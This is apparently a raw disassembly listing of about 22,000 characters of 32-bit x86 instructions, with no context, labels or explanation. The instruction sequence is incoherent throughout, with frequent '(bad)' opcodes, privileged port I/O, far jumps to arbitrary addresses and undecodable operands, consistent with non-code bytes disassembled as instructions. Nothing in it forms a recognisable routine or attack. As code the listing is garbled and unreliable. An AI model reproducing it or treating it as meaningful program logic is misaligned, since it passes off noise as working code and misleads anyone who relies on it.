  40c73f:	stos   DWORD PTR es:[edi],eax
  40c740:	or     DWORD PTR [edx],eax
  40c742:	jecxz  0x40c797
  40c744:	sti    
  40c745:	push   ebp
  40c746:	adc    al,0xd0
  40c748:	adc    al,0x14
  40c74a:	dec    ebx
  40c74b:	push   ss
  40c74c:	sahf   
  40c74d:	or     BYTE PTR [ebx],dh
  40c74f:	cdq    
  40c750:	mov    ebx,DWORD PTR [esi-0x7d]
  40c753:	fld    QWORD PTR [ebx]
  40c755:	mov    dh,0x2c
  40c757:	xlat   BYTE PTR ds:[ebx]
  40c758:	push   ecx
  40c759:	sbb    al,0xee
  40c75b:	leave  
  40c75c:	dec    ebp
  40c75d:	retf   0x31e8
  40c760:	or     BYTE PTR [edi],0xd4
  40c763:	ins    BYTE PTR es:[edi],dx
  40c764:	repnz dec esi
  40c766:	xchg   ebx,eax
  40c767:	pop    es
  40c768:	push   edi
  40c769:	mov    DWORD PTR [edx+0x73],ecx
  40c76c:	or     edx,DWORD PTR [edx-0x16]
  40c76f:	pop    ss
  40c770:	push   ebp
  40c771:	int3   
  40c772:	mov    eax,0xb58699c1
  40c777:	ins    DWORD PTR es:[edi],dx
  40c778:	je     0x40c76e
  40c77a:	mov    eax,ds:0x2b6d22fb
  40c77f:	add    al,BYTE PTR [ecx-0x4b78bf80]
  40c785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c786:	or     DWORD PTR [edi+ebp*8],edx
  40c789:	cmc    
  40c78a:	popa   
  40c78b:	and    BYTE PTR [ebp-0x4c34b35b],bh
  40c791:	add    BYTE PTR [edx+0x233d0408],dl
  40c797:	push   edi
  40c798:	xchg   BYTE PTR [esi+0x199b46b8],bh
  40c79e:	adc    DWORD PTR [edi],esi
  40c7a0:	jne    0x40c7f5
  40c7a2:	mov    esi,0x428978da
  40c7a7:	xchg   BYTE PTR [edx+0x39],dl
  40c7aa:	xor    BYTE PTR [di],dl
  40c7ad:	retf   0xe8
  40c7b0:	mov    ds:0xed444b5f,eax
  40c7b5:	sub    eax,0x6d281f33
  40c7ba:	xor    bh,BYTE PTR [ebx]
  40c7bc:	call   0x36291e62
  40c7c1:	mov    ds:0xd9f3d8be,eax
  40c7c6:	out    0xa4,al
  40c7c8:	xor    BYTE PTR [edx+0x6c195ceb],dh
  40c7ce:	(bad)  [ebp-0x3f]
  40c7d1:	out    dx,al
  40c7d2:	add    DWORD PTR [edi+0x2f2e7067],edi
  40c7d8:	jno    0x40c779
  40c7da:	lods   al,BYTE PTR ds:[esi]
  40c7db:	cmc    
  40c7dc:	add    esi,DWORD PTR [eax-0x7a]
  40c7df:	mov    bh,0x73
  40c7e1:	and    edi,DWORD PTR [edx]
  40c7e3:	mov    ecx,0x2e92c870
  40c7e8:	ss jne 0x40c79f
  40c7eb:	jbe    0x40c837
  40c7ed:	mulps  xmm5,XMMWORD PTR [esi+0x76728ab]
  40c7f4:	in     al,dx
  40c7f5:	add    esp,DWORD PTR [edi-0x55]
  40c7f8:	call   0xf3acc020
  40c7fd:	sub    ah,BYTE PTR [ebp+0x745a20f1]
  40c803:	add    bh,bl
  40c805:	int3   
  40c806:	mov    fs,WORD PTR [eax]
  40c808:	push   0x6208f296
  40c80d:	adc    bh,BYTE PTR ds:0x8e1ec37a
  40c813:	pop    ds
  40c814:	pusha  
  40c815:	cmp    DWORD PTR [esi],esp
  40c817:	inc    ebp
  40c818:	rol    BYTE PTR [ebp+0x51],0xe3
  40c81c:	dec    ebp
  40c81d:	jle    0x40c7a6
  40c81f:	inc    edi
  40c820:	sub    BYTE PTR ds:0xb44bc2ba,ch
  40c826:	add    ch,0xfd
  40c829:	repz or bh,BYTE PTR [ebx]
  40c82c:	sub    DWORD PTR [edx+0x72159dd7],edx
  40c832:	cs mov ah,0x9
  40c835:	xor    DWORD PTR [esi-0x8],0xffffff90
  40c839:	scas   al,BYTE PTR es:[edi]
  40c83a:	fcom   DWORD PTR [eax+0x27]
  40c83d:	mov    cl,0x2a
  40c83f:	adc    eax,0x2402cb3d
  40c844:	popf   
  40c845:	push   ds
  40c846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c847:	popf   
  40c848:	mov    al,ds:0xb73a83b3
  40c84d:	xchg   edx,eax
  40c84e:	out    0xfd,al
  40c850:	in     al,0xe4
  40c852:	cmp    bl,BYTE PTR [edi]
  40c854:	pop    es
  40c855:	lods   eax,DWORD PTR ds:[esi]
  40c856:	sahf   
  40c857:	dec    eax
  40c858:	or     eax,0x50c68241
  40c85d:	and    ebp,DWORD PTR [edx-0xe2731ae]
  40c863:	fst    DWORD PTR [esi+0x41]
  40c866:	mov    esp,0xc5d4e702
  40c86b:	loopne 0x40c851
  40c86d:	jbe    0x40c810
  40c86f:	inc    edx
  40c870:	mov    bh,0xc6
  40c872:	mov    WORD PTR [edi-0x21c1c6f1],gs
  40c878:	xchg   BYTE PTR [edi+0x7cee6fce],cl
  40c87e:	push   ds
  40c87f:	shl    BYTE PTR [esi],0xd3
  40c882:	dec    edx
  40c883:	jmp    0x40c81e
  40c885:	outs   dx,DWORD PTR ds:[esi]
  40c886:	test   BYTE PTR [edi-0x27e07b2e],al
  40c88c:	and    eax,0x148000aa
  40c891:	inc    esp
  40c892:	ins    DWORD PTR es:[edi],dx
  40c893:	and    al,0x1e
  40c895:	cmp    eax,esi
  40c897:	xor    eax,edi
  40c899:	xchg   esp,eax
  40c89a:	xchg   esp,eax
  40c89b:	mov    eax,DWORD PTR [ebp-0x31]
  40c89e:	add    ebp,esi
  40c8a0:	and    al,0x25
  40c8a2:	pop    ds
  40c8a3:	and    BYTE PTR ds:[ecx+0x61],0x5c
  40c8a8:	jno    0x40c849
  40c8aa:	add    eax,0x2ae9ad97
  40c8af:	inc    ebp
  40c8b0:	or     eax,0xf2a37c9a
  40c8b5:	cwde   
  40c8b6:	popa   
  40c8b7:	fisttp QWORD PTR [ebp-0x21]
  40c8ba:	and    al,0x23
  40c8bc:	test   al,0x6a
  40c8be:	repz out dx,eax
  40c8c0:	jns    0x40c87c
  40c8c2:	sub    DWORD PTR [ecx],0x392c97f3
  40c8c8:	lock sbb dl,ch
  40c8cb:	pushf  
  40c8cc:	pop    ebp
  40c8cd:	repnz test ch,ch
  40c8d0:	or     al,0xab
  40c8d2:	jge    0x40c902
  40c8d4:	add    eax,0x90cd7b4e
  40c8d9:	(bad)  [esi]
  40c8db:	and    eax,0xf7c990f1
  40c8e0:	pop    ebx
  40c8e1:	pop    ebx
  40c8e2:	iret   
  40c8e3:	pop    ss
  40c8e4:	mov    ecx,edi
  40c8e6:	das    
  40c8e7:	ins    DWORD PTR es:[edi],dx
  40c8e8:	push   cs
  40c8e9:	jmp    FWORD PTR ds:0x1c2931ca
  40c8ef:	ret    
  40c8f0:	dec    eax
  40c8f1:	jns    0x40c942
  40c8f3:	inc    ebp
  40c8f4:	mov    DWORD PTR [edx-0x4f887587],ecx
  40c8fa:	push   ecx
  40c8fb:	popf   
  40c8fc:	mov    al,0xcd
  40c8fe:	xor    DWORD PTR [esi+ecx*8+0x6724c95b],ebp
  40c905:	inc    esp
  40c906:	(bad)  [ebx]
  40c908:	mov    ah,0x90
  40c90a:	dec    eax
  40c90b:	and    edx,eax
  40c90d:	jns    0x40c953
  40c90f:	xor    ah,BYTE PTR [eax]
  40c911:	out    dx,al
  40c912:	in     al,0x24
  40c914:	adc    al,0x21
  40c916:	pop    eax
  40c917:	inc    ecx
  40c918:	int3   
  40c919:	mov    dh,0x6f
  40c91b:	dec    ebp
  40c91c:	std    
  40c91d:	mov    esi,0xa85e3253
  40c922:	cwde   
  40c923:	nop
  40c924:	pop    eax
  40c925:	pop    ebx
  40c926:	outs   dx,DWORD PTR ds:[esi]
  40c927:	out    dx,al
  40c928:	mov    cs,WORD PTR [ebp-0xf]
  40c92b:	mov    bl,0x4e
  40c92d:	mov    bl,BYTE PTR [edx+ebx*2-0x2f55c212]
  40c934:	cmp    eax,0xd60bc5bf
  40c939:	imul   ebp,eax,0x69
  40c93c:	test   BYTE PTR [edx-0x7b],al
  40c93f:	add    esp,eax
  40c941:	test   BYTE PTR [edx-0x6e09db5b],ah
  40c947:	fdiv   st(3),st
  40c949:	dec    edx
  40c94a:	ror    BYTE PTR [ebx+ebp*8],cl
  40c94d:	test   BYTE PTR [edx],dl
  40c94f:	es (bad) 
  40c951:	dec    edx
  40c952:	fisttp QWORD PTR [esp+ebx*4-0x6]
  40c956:	push   eax
  40c957:	lock adc ebp,esp
  40c95a:	cmp    al,0x9f
  40c95c:	mov    edx,ebx
  40c95e:	loop   0x40c99c
  40c960:	sub    bl,BYTE PTR [edi]
  40c962:	jns    0x40c9a1
  40c964:	clc    
  40c965:	mov    ebx,0xb439ae09
  40c96a:	inc    edi
  40c96b:	add    cl,dh
  40c96d:	xchg   ecx,eax
  40c96e:	add    al,0x54
  40c970:	dec    ebx
  40c971:	retf   0xaa88
  40c974:	push   esi
  40c975:	pop    esi
  40c976:	mov    esp,0x23b8cc0
  40c97b:	adc    edi,esp
  40c97d:	dec    ecx
  40c97e:	lock jge 0x40c952
  40c981:	or     al,0x18
  40c983:	or     BYTE PTR [esi+esi*2],bh
  40c986:	jbe    0x40c91b
  40c988:	ret    
  40c989:	fisttp WORD PTR [edx]
  40c98b:	mov    al,0xcf
  40c98d:	mov    edi,DWORD PTR [edx]
  40c98f:	mov    es,WORD PTR [ecx-0x4804fcc7]
  40c995:	mov    ah,ch
  40c997:	aad    0x5
  40c999:	jl     0x40c98c
  40c99b:	dec    ecx
  40c99c:	adc    ebx,edi
  40c99e:	retf   
  40c99f:	lods   al,BYTE PTR ss:[esi]
  40c9a1:	add    BYTE PTR [edi+0x74078b09],0xb1
  40c9a8:	cdq    
  40c9a9:	je     0x40c9b8
  40c9ab:	dec    edx
  40c9ac:	xlat   BYTE PTR ds:[ebx]
  40c9ad:	pop    es
  40c9ae:	adc    al,0xc8
  40c9b0:	sti    
  40c9b1:	dec    edx
  40c9b2:	stos   DWORD PTR es:[edi],eax
  40c9b3:	push   eax
  40c9b4:	mov    cl,0xb1
  40c9b6:	or     dh,bh
  40c9b8:	inc    esi
  40c9b9:	dec    ecx
  40c9ba:	cdq    
  40c9bb:	sbb    BYTE PTR [ebp-0x352b4a72],ch
  40c9c1:	das    
  40c9c2:	xor    DWORD PTR [esi],edx
  40c9c4:	fcomp  QWORD PTR [eax+esi*1+0x13eb8e4b]
  40c9cb:	xor    al,0xd0
  40c9cd:	sub    edi,DWORD PTR [edx]
  40c9cf:	sub    eax,0x8b815d7b
  40c9d4:	xchg   ebp,eax
  40c9d5:	pop    esi
  40c9d6:	or     DWORD PTR [edx+eiz*8+0x503a2fc7],0xffffff9a
  40c9de:	repnz sbb eax,0xf51b5f6
  40c9e4:	sbb    BYTE PTR [edx+0x19],bl
  40c9e7:	push   ebx
  40c9e8:	inc    edi
  40c9e9:	(bad)  
  40c9ea:	out    0x60,eax
  40c9ec:	mov    al,BYTE PTR [edi+0x1b]
  40c9ef:	adc    al,BYTE PTR [esi+0x13458d8b]
  40c9f5:	shl    BYTE PTR [edx+ecx*1],cl
  40c9f8:	sub    al,0x3
  40c9fa:	cmp    dh,BYTE PTR [eax+0x4515674b]
  40ca00:	and    eax,0x305edab2
  40ca05:	es out 0x98,al
  40ca08:	mov    al,ds:0x7968e463
  40ca0d:	jb     0x40ca11
  40ca0f:	ret    
  40ca10:	add    dh,BYTE PTR [ebp-0x6b1adaa3]
  40ca16:	pushw  0x4d
  40ca19:	fst    DWORD PTR [ebp+0x5e31dc80]
  40ca1f:	inc    edi
  40ca20:	xchg   esp,eax
  40ca21:	mov    ebx,0xd99d7e37
  40ca26:	nop
  40ca27:	in     eax,dx
  40ca28:	or     eax,0x5746afa1
  40ca2d:	les    esp,FWORD PTR es:[edx+0x1a]
  40ca31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca32:	cmp    eax,0xa903c079
  40ca37:	inc    ebp
  40ca38:	push   edx
  40ca39:	and    edx,edx
  40ca3b:	push   eax
  40ca3c:	imul   ebp,eax,0x56100dd4
  40ca42:	(bad)
  40ca45:	inc    esp
  40ca46:	push   ebp
  40ca47:	jge    0x40c9ef
  40ca49:	and    eax,0x16f36315
  40ca4e:	jle    0x40ca39
  40ca50:	iret   
  40ca51:	rcl    BYTE PTR cs:[edx],cl
  40ca54:	scas   al,BYTE PTR es:[edi]
  40ca55:	mov    ah,0x36
  40ca57:	mov    dl,0xfa
  40ca59:	jo     0x40c9e0
  40ca5b:	xor    eax,0x7fab0d2
  40ca60:	mov    esi,0x6a185efd
  40ca65:	or     al,0x91
  40ca67:	lods   al,BYTE PTR ds:[esi]
  40ca68:	into   
  40ca69:	inc    esp
  40ca6a:	lods   al,BYTE PTR ds:[esi]
  40ca6b:	ins    BYTE PTR es:[edi],dx
  40ca6c:	jb     0x40ca3d
  40ca6e:	inc    ecx
  40ca6f:	and    BYTE PTR [edx],al
  40ca71:	mov    edi,0xaefc9337
  40ca76:	xor    al,0xc5
  40ca78:	mov    cl,0x6d
  40ca7a:	ret    
  40ca7b:	enter  0xe5ff,0x25
  40ca7f:	adc    edi,DWORD PTR [eax]
  40ca81:	jb     0x40cad5
  40ca83:	aam    0xa
  40ca85:	xchg   ebp,eax
  40ca86:	sub    bl,BYTE PTR [esp+ebp*8+0x3c]
  40ca8a:	add    BYTE PTR [edx+0x6d],cl
  40ca8d:	mov    eax,ds:0xef08a738
  40ca92:	adc    BYTE PTR ss:[edx],cl
  40ca95:	sub    al,0xb2
  40ca97:	xor    esi,DWORD PTR ds:0x86b58463
  40ca9d:	scas   al,BYTE PTR es:[edi]
  40ca9e:	daa    
  40ca9f:	call   0xbee1:0x259609f6
  40caa6:	fsub   DWORD PTR [edx+0x21]
  40caa9:	in     al,0x9e
  40caab:	pop    esp
  40caac:	inc    eax
  40caad:	mov    ebx,0xad609ece
  40cab2:	out    dx,al
  40cab3:	mov    ebp,0x49db6952
  40cab8:	fiadd  WORD PTR [edi+0x4cfb8e08]
  40cabe:	pop    edi
  40cabf:	stos   DWORD PTR es:[edi],eax
  40cac0:	jmp    0xdc15d208
  40cac5:	dec    edx
  40cac6:	ss pop ebp
  40cac8:	mov    edx,0xef25b7
  40cacd:	sbb    BYTE PTR [esi+0x30],al
  40cad0:	or     al,0x16
  40cad2:	je     0x40ca97
  40cad4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cad5:	shl    dl,cl
  40cad7:	xchg   ebx,eax
  40cad8:	add    esi,DWORD PTR [edi+0x78]
  40cadb:	int3   
  40cadc:	sbb    bh,BYTE PTR [eax-0x80]
  40cadf:	pop    eax
  40cae0:	cld    
  40cae1:	push   es
  40cae2:	adc    al,0x14
  40cae4:	jb     0x40cafb
  40cae6:	test   DWORD PTR [eax+eiz*4],edx
  40cae9:	push   edx
  40caea:	jne    0x40cae6
  40caec:	arpl   WORD PTR [esi-0x2e],bp
  40caef:	clc    
  40caf0:	(bad)  
  40caf1:	xchg   edi,eax
  40caf2:	push   0xccd7382d
  40caf7:	sahf   
  40caf8:	into   
  40caf9:	and    BYTE PTR [ebp-0x46],ch
  40cafc:	add    ebp,DWORD PTR [eax]
  40cafe:	mov    ds:0xbe658d22,eax
  40cb03:	mov    bl,0x43
  40cb05:	retf   
  40cb06:	cli    
  40cb07:	jne    0x40cb81
  40cb09:	mov    edx,0x7392bad9
  40cb0e:	pop    ebp
  40cb0f:	stc    
  40cb10:	popf   
  40cb11:	lock loope 0x40cb5c
  40cb14:	mov    ah,0xb1
  40cb16:	es jmp 0x40cb51
  40cb19:	mov    dl,ah
  40cb1b:	pop    ds
  40cb1c:	in     al,0x46
  40cb1e:	cmp    DWORD PTR [edi-0x4f],eax
  40cb21:	inc    edx
  40cb22:	and    DWORD PTR [eax+0x7d1f5796],esi
  40cb28:	inc    edi
  40cb29:	xchg   esp,eax
  40cb2a:	les    eax,FWORD PTR [edx+eiz*1-0x4]
  40cb2e:	stos   DWORD PTR es:[edi],eax
  40cb2f:	mov    WORD PTR [ebp+0x51b5d9bb],es
  40cb35:	add    BYTE PTR [ecx],bl
  40cb37:	dec    esp
  40cb38:	dec    ebx
  40cb39:	ret    
  40cb3a:	fwait
  40cb3b:	xchg   edi,eax
  40cb3c:	addr16 in eax,0x98
  40cb3f:	jnp    0x40cb5f
  40cb41:	dec    ecx
  40cb42:	jno    0x40cb81
  40cb44:	inc    eax
  40cb45:	xchg   esi,eax
  40cb46:	mov    esi,0xa457438c
  40cb4b:	cmp    DWORD PTR [ecx+0x14],0x43
  40cb4f:	dec    edx
  40cb50:	not    DWORD PTR [ebx]
  40cb52:	repnz lods eax,DWORD PTR ds:[esi]
  40cb54:	adc    esp,ebp
  40cb56:	sahf   
  40cb57:	pop    ss
  40cb58:	mov    dh,0xf2
  40cb5a:	adc    eax,0x6030a146
  40cb5f:	cwde   
  40cb60:	or     eax,0x123a08e2
  40cb65:	sar    BYTE PTR [ecx+eax*8-0x164efc4d],cl
  40cb6c:	add    dl,BYTE PTR [ebx-0x74]
  40cb6f:	mov    esp,0x4819330f
  40cb74:	repnz adc ecx,DWORD PTR [ecx-0x8ec99d2]
  40cb7b:	sbb    eax,0x9a37ade8
  40cb80:	(bad)  
  40cb83:	cmp    DWORD PTR [ebx+ecx*2],esi
  40cb86:	xor    BYTE PTR [ecx+0x36ea4c0a],0x97
  40cb8d:	inc    ebx
  40cb8e:	cmp    ebp,eax
  40cb90:	fabs   
  40cb92:	mov    bl,0x15
  40cb94:	and    BYTE PTR [esi-0x7ff9b480],ah
  40cb9a:	aad    0x21
  40cb9c:	out    0xec,al
  40cb9e:	and    esp,DWORD PTR [esi-0x4cda7a31]
  40cba4:	add    DWORD PTR [ecx],eax
  40cba6:	clc    
  40cba7:	div    DWORD PTR [eax]
  40cba9:	outs   dx,DWORD PTR ds:[esi]
  40cbaa:	push   0xffffff90
  40cbac:	jae    0x40cb62
  40cbae:	cmp    al,0x87
  40cbb0:	xor    al,0xef
  40cbb2:	hlt    
  40cbb3:	inc    edx
  40cbb4:	add    eax,0xa1e651b4
  40cbb9:	pushf  
  40cbba:	and    ebp,DWORD PTR [eax-0x38b3ca03]
  40cbc0:	jae    0x40cbc2
  40cbc2:	sbb    al,0x1b
  40cbc4:	adc    DWORD PTR [edx-0x5b],edx
  40cbc7:	imul   edi
  40cbc9:	sub    BYTE PTR [edx+0x6e26f4f0],bl
  40cbcf:	adc    al,0xc7
  40cbd1:	stos   DWORD PTR es:[edi],eax
  40cbd2:	dec    ecx
  40cbd3:	add    cl,BYTE PTR [ebp-0x63c697ec]
  40cbd9:	repnz adc ch,BYTE PTR [esi+0x6daf2949]
  40cbe0:	rep outs dx,BYTE PTR ds:[esi]
  40cbe2:	scas   eax,DWORD PTR es:[edi]
  40cbe3:	je     0x40cc36
  40cbe5:	out    0x23,al
  40cbe7:	(bad)  [edx-0x15d33525]
  40cbed:	stos   DWORD PTR es:[edi],eax
  40cbee:	mov    ch,0xc6
  40cbf0:	aad    0x59
  40cbf2:	push   esp
  40cbf3:	dec    edx
  40cbf4:	ror    dl,cl
  40cbf6:	mov    ecx,0x118cea0e
  40cbfb:	sbb    eax,0xa126c6d9
  40cc00:	and    edi,DWORD PTR [ebx+0x6e]
  40cc03:	cwde   
  40cc04:	mov    al,ds:0xb6f9e844
  40cc09:	ret    
  40cc0a:	data16 adc ch,cl
  40cc0d:	(bad)  
  40cc0e:	ins    BYTE PTR es:[edi],dx
  40cc0f:	mov    esi,0x8d0f0180
  40cc14:	sub    BYTE PTR [ebx+0xe],0xdd
  40cc18:	in     al,dx
  40cc19:	xor    eax,0x96a96cbb
  40cc1e:	dec    ebp
  40cc1f:	jge    0x40cbe6
  40cc21:	dec    ebp
  40cc22:	(bad)  
  40cc23:	cs aad 0xf3
  40cc26:	aad    0x17
  40cc28:	repnz inc ebx
  40cc2a:	call   0x91054b15
  40cc2f:	(bad)  
  40cc30:	div    DWORD PTR [ebp-0x3b]
  40cc33:	pusha  
  40cc34:	cmp    ebp,esi
  40cc36:	add    DWORD PTR [ebx],edx
  40cc38:	loope  0x40ccb7
  40cc3a:	sbb    bh,BYTE PTR [esi+edi*8]
  40cc3d:	div    DWORD PTR [ebx-0x33]
  40cc40:	arpl   WORD PTR [edx],bp
  40cc42:	mov    ebx,0x5ab3a4a
  40cc47:	test   eax,0xae337a6f
  40cc4c:	pop    edi
  40cc4d:	xchg   esi,eax
  40cc4e:	outs   dx,BYTE PTR ds:[esi]
  40cc4f:	(bad)  
  40cc50:	test   eax,0x7cee9bcf
  40cc55:	pop    eax
  40cc56:	sub    eax,0x41a0e5df
  40cc5b:	jb     0x40cc4f
  40cc5d:	and    esi,DWORD PTR [eax+eax*8+0x30]
  40cc61:	xchg   ebx,eax
  40cc62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc63:	int3   
  40cc64:	fcom   QWORD PTR ds:0xae5aee3e
  40cc6a:	sbb    bl,BYTE PTR [edx]
  40cc6c:	retf   0x9ca1
  40cc6f:	fs jbe 0x40cce6
  40cc72:	xchg   esp,eax
  40cc73:	dec    ecx
  40cc74:	pushf  
  40cc75:	mov    ?,WORD PTR [ebx+0xa]
  40cc78:	xor    cl,BYTE PTR [esi+0x56061f47]
  40cc7e:	outs   dx,DWORD PTR ds:[esi]
  40cc7f:	test   eax,0x9efd477e
  40cc84:	pop    esi
  40cc85:	add    al,0xdc
  40cc87:	xor    ebx,DWORD PTR [ebx+0x7]
  40cc8a:	adc    al,0x45
  40cc8c:	sbb    bh,BYTE PTR [ecx+0x30]
  40cc8f:	or     esi,DWORD PTR [edi+esi*4-0x128005f8]
  40cc96:	aas    
  40cc97:	fisttp DWORD PTR [eax-0x11a4e70a]
  40cc9d:	jbe    0x40cc3a
  40cc9f:	retf   
  40cca0:	pop    eax
  40cca1:	push   esi
  40cca2:	inc    ebx
  40cca3:	adc    BYTE PTR [edx],0xc
  40cca6:	xor    BYTE PTR [ebp+0x49],dh
  40cca9:	in     eax,dx
  40ccaa:	sbb    DWORD PTR [ebp+0x5e],ebx
  40ccad:	jae    0x40ccac
  40ccaf:	and    dl,BYTE PTR [ecx+0x6c]
  40ccb2:	test   eax,0xd9d37c3
  40ccb7:	jge    0x40cc6e
  40ccb9:	sar    WORD PTR [ebx],1
  40ccbc:	add    al,0x4d
  40ccbe:	push   edx
  40ccbf:	and    esi,DWORD PTR [edi-0x10]
  40ccc2:	punpckhwd mm3,mm0
  40ccc5:	xchg   esp,eax
  40ccc6:	or     dh,BYTE PTR [ecx+0x5f2ba2b]
  40cccc:	stos   DWORD PTR es:[edi],eax
  40cccd:	enter  0x5f32,0x4b
  40ccd1:	xor    BYTE PTR [ebp-0x6b82267],bh
  40ccd7:	call   0xdfd1:0x2e7fea66
  40ccde:	mov    dh,0x99
  40cce0:	xchg   edx,eax
  40cce1:	mov    ds:0xd268a451,eax
  40cce6:	(bad)  
  40cce8:	leave  
  40cce9:	out    0x41,eax
  40cceb:	dec    eax
  40ccec:	ins    BYTE PTR es:[edi],dx
  40cced:	and    dl,cl
  40ccef:	xor    eax,0x7fa62068
  40ccf4:	cli    
  40ccf5:	out    0xb5,al
  40ccf7:	or     eax,0x5fedd3a
  40ccfc:	sbb    BYTE PTR [esi-0x4f],0xaa
  40cd00:	std    
  40cd01:	jecxz  0x40cd79
  40cd03:	push   cs
  40cd04:	loope  0x40cce6
  40cd06:	std    
  40cd07:	inc    ebp
  40cd08:	cs pusha 
  40cd0a:	stos   DWORD PTR es:[edi],eax
  40cd0b:	sbb    DWORD PTR [esp+edx*8],0x4d
  40cd0f:	loop   0x40cc9d
  40cd11:	adc    BYTE PTR [ebx+0x29dd0211],0x48
  40cd18:	pop    eax
  40cd19:	jne    0x40cd65
  40cd1b:	outs   dx,BYTE PTR ds:[esi]
  40cd1c:	mov    ?,WORD PTR [edx-0x65]
  40cd1f:	or     edi,DWORD PTR [ebp+ebx*4-0x3e]
  40cd23:	in     eax,0x2
  40cd25:	stos   BYTE PTR es:[edi],al
  40cd26:	dec    ecx
  40cd27:	call   0xd966:0x87f13711
  40cd2e:	push   esp
  40cd2f:	out    0xa8,eax
  40cd31:	pop    ss
  40cd32:	mov    eax,0xf88131f8
  40cd37:	ss fwait
  40cd39:	(bad)  
  40cd3a:	retf   
  40cd3b:	cmp    DWORD PTR [esi],0xffffffac
  40cd3e:	push   eax
  40cd3f:	xchg   esi,eax
  40cd40:	or     al,0xca
  40cd42:	mov    ecx,edi
  40cd44:	ins    BYTE PTR es:[edi],dx
  40cd45:	mov    al,0xf6
  40cd47:	push   0x27
  40cd49:	mov    ebx,0x48de2066
  40cd4e:	hlt    
  40cd4f:	fcmovu st,st(0)
  40cd51:	push   cs
  40cd52:	retf   0x8c80
  40cd55:	or     eax,0xedc12baf
  40cd5a:	adc    al,bl
  40cd5c:	jmp    0xd12d:0x1b9cade1
  40cd63:	std    
  40cd64:	xor    eax,DWORD PTR [esp+edx*4]
  40cd67:	lds    ecx,FWORD PTR [esp+0x4d39440d]
  40cd6e:	add    BYTE PTR [ebp+0x11ad7d6a],ah
  40cd74:	(bad)  
  40cd76:	sbb    BYTE PTR [edi-0x4f],cl
  40cd79:	sti    
  40cd7a:	je     0x40cdec
  40cd7c:	ret    
  40cd7d:	mov    al,0x91
  40cd7f:	xor    DWORD PTR ds:0xfb067da6,esp
  40cd85:	add    al,0x10
  40cd87:	loopne 0x40ce01
  40cd89:	loop   0x40cd41
  40cd8b:	test   DWORD PTR [ecx+0x44],eax
  40cd8e:	sahf   
  40cd8f:	cdq    
  40cd90:	in     al,0x64
  40cd92:	shr    esi,0x2c
  40cd95:	adc    eax,0x5274a9b1
  40cd9a:	mov    ebx,0xc7653a4f
  40cd9f:	sub    BYTE PTR [ebx-0x3d0b9a21],bl
  40cda5:	sbb    eax,DWORD PTR [edx]
  40cda7:	mov    edx,0x79723718
  40cdac:	inc    ecx
  40cdad:	rcl    DWORD PTR [esi+0x26],cl
  40cdb0:	mov    ebx,0x373b731
  40cdb5:	jb     0x40cdf9
  40cdb7:	std    
  40cdb8:	jecxz  0x40cde5
  40cdba:	mov    eax,ds:0x17d197dc
  40cdbf:	push   esi
  40cdc0:	fs mov dh,0x6d
  40cdc3:	xchg   esp,eax
  40cdc4:	nop
  40cdc5:	pop    ebp
  40cdc6:	push   esp
  40cdc7:	scas   eax,DWORD PTR es:[edi]
  40cdc8:	sbb    eax,0x69a7948c
  40cdcd:	add    bl,BYTE PTR [edx+edx*1+0x65c673ec]
  40cdd4:	mov    ebx,0x2da8eae4
  40cdd9:	(bad)  
  40cdda:	leave  
  40cddb:	(bad)  
  40cddc:	xor    edi,DWORD PTR [ecx+ecx*8+0x51]
  40cde0:	mov    al,BYTE PTR [ebx]
  40cde2:	dec    esp
  40cde3:	repz sbb al,0xd1
  40cde6:	pop    ss
  40cde7:	es inc ebp
  40cde9:	lods   al,BYTE PTR ds:[esi]
  40cdea:	ror    DWORD PTR [esi+0x79],1
  40cded:	adc    ebx,DWORD PTR [ebx+0xf]
  40cdf0:	fisub  DWORD PTR [edx*8+0x449d4802]
  40cdf7:	xchg   esi,eax
  40cdf8:	xchg   ebx,eax
  40cdf9:	les    esi,FWORD PTR [eax+0x6a28fd4a]
  40cdff:	ret    
  40ce00:	push   esi
  40ce01:	addr16 daa 
  40ce03:	sbb    BYTE PTR [eax-0x798d92b6],cl
  40ce09:	mov    ah,0x21
  40ce0b:	es dec edx
  40ce0d:	call   0x81c30ee5
  40ce12:	jmp    0x363999c4
  40ce17:	shr    ebx,cl
  40ce19:	jbe    0x40ce83
  40ce1b:	enter  0x27cd,0x70
  40ce1f:	and    eax,0xe404485e
  40ce24:	push   eax
  40ce25:	mov    dh,0xa7
  40ce27:	js     0x40cddf
  40ce29:	out    0x5a,al
  40ce2b:	cld    
  40ce2c:	data16 sub al,0x96
  40ce2f:	inc    eax
  40ce30:	xchg   ebx,eax
  40ce31:	xchg   BYTE PTR [ecx-0x2e4a978f],al
  40ce37:	addr16 int3 
  40ce39:	mov    BYTE PTR [ebx+eax*2],ah
  40ce3c:	sar    DWORD PTR [eax-0x25],cl
  40ce3f:	sub    ebp,ebx
  40ce41:	jmp    0xe50:0x85ff0265
  40ce48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce49:	repz out dx,eax
  40ce4b:	mov    ebx,?
  40ce4d:	daa    
  40ce4e:	add    dl,ah
  40ce50:	lahf   
  40ce51:	ds into 
  40ce53:	outs   dx,DWORD PTR ds:[esi]
  40ce54:	dec    ecx
  40ce55:	imul   edi,edx,0x16
  40ce58:	or     DWORD PTR [ebx],eax
  40ce5a:	mov    eax,ds:0xfbaa7136
  40ce5f:	ins    BYTE PTR es:[edi],dx
  40ce60:	aas    
  40ce61:	in     eax,dx
  40ce62:	iret   
  40ce63:	(bad)  
  40ce64:	xchg   ebp,eax
  40ce65:	mov    bl,0xa5
  40ce67:	fidivr DWORD PTR [edi-0x31]
  40ce6a:	sbb    BYTE PTR [ebx],ah
  40ce6c:	sbb    edi,ecx
  40ce6e:	fisub  WORD PTR [ebx+0x7ca42281]
  40ce74:	addr16 inc ecx
  40ce76:	pop    ebp
  40ce77:	test   al,0x6e
  40ce79:	or     DWORD PTR [ebx-0x5f1f677f],ecx
  40ce7f:	sbb    eax,0x3f89bb38
  40ce84:	jo     0x40cec5
  40ce86:	mov    BYTE PTR [edx],bl
  40ce88:	mov    bh,0x51
  40ce8a:	lock std 
  40ce8c:	(bad)  
  40ce8d:	xchg   edi,eax
  40ce8e:	add    al,0xb3
  40ce90:	je     0x40cea5
  40ce92:	rcr    BYTE PTR [esp+eiz*2+0x5d],1
  40ce96:	(bad)  
